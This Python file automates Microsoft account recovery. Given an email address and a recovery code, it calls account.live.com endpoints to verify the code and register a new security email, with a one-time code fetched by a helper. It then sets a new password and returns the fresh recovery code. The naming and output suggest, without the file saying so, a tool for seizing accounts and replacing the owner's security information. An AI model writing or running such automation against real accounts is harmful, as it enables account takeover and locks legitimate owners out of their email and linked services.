from views.utils.securing.getEmailCode import getEmailCode
from urllib.parse import unquote
import requests
import codecs
import json
import re

def recoveryCodeSecure(email: str, recoveryCode: str, new_email: str, new_password: str, donarev_token: str):
    
    data = requests.get(
        url = f"https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/oauth20_authorize.srf&mn={email}"
    )

    amsc = dict(data.cookies)["amsc"]
    serverData = json.loads(re.search(r"var\s+ServerData=(.*?)(?=;|$)", data.text).group(1))

    recToken = requests.post(
        url = "https://account.live.com/API/Recovery/VerifyRecoveryCode",
        headers = {
            "Content-type": "application/json; charset=utf-8",
            "Accept": "application/json",
            "Cookie": f"amsc={amsc}",
            "canary": serverData["apiCanary"],
            "hpgid": "200284",
            "hpgact": "0"
        },
        json = {
            "recoveryCode": recoveryCode,
            "code": recoveryCode,
            "scid": 100103,
            "token": codecs.decode(unquote(serverData["sRecoveryToken"]), "unicode_escape"),
            "uiflvr": 1001
        }
    ).json()

    if "token" in recToken and "apiCanary" in recToken:
        
        canary = recToken["apiCanary"]

        sendCode = requests.post(
            url = "https://account.live.com/api/Proofs/SendOtt",
            headers = {
                "Content-type": "application/json; charset=utf-8",
                "Accept": "application/json",
                "canary": canary,
                "hpgid": "200284",
                "hpgact": "0",
                "Cookie": f"amsc={amsc}"
            },
            json = {
                "associationType": "None",
                "action": "VerifyNewProof",
                "channel": "Email",
                "cxt": "MP",
                "proofId": new_email,
                "scid": 100103,
                "token": recToken["token"],
                "uiflvr": 1001
            }
        ).json()

        if "apiCanary" in sendCode:
            
            canary = sendCode["apiCanary"]
            
            code = getEmailCode(new_email, donarev_token)

            verifyCodeResponse = requests.post(
                url = "https://account.live.com/API/Proofs/VerifyCode",
                headers = {
                    "Content-type": "application/json; charset=utf-8",
                    "Accept": "application/json",
                    "canary": canary,
                    "hpgid": "200284",
                    "hpgact": "0",
                    "Cookie": f"amsc={amsc}"
                },
                json = {
                    "action": "VerifyOtc",
                    "proofId": new_email,
                    "scid": 100103,
                    "token": recToken["token"],
                    "uiflvr": 1001,
                    "code": code
                }
            ).json()

            canary = verifyCodeResponse["apiCanary"]

            finishSecure = requests.post(
                url = "https://account.live.com/API/Recovery/RecoverUser",
                headers = {
                    "Content-type": "application/json; charset=utf-8",
                    "Accept": "application/json",
                    "canary": canary,
                    "hpgid": "200284",
                    "hpgact": "0",
                    "Cookie": f"amsc={amsc}"
                },
                json = {
                    "contactEmail": new_email,
                    "contactEpid": "",
                    "password": new_password,
                    "passwordExpiryEnabled": 0,
                    "scid": 100103,
                    "token": recToken["token"],
                    "uaid":"6b182876e51a429db0e2cff317076750",
                    "uiflvr": 1001
                }
            ).json()

            if "recoveryCode" in finishSecure:

                print("[+] - Changed security email and password!")
                return [finishSecure["recoveryCode"], new_password]
            
            return None
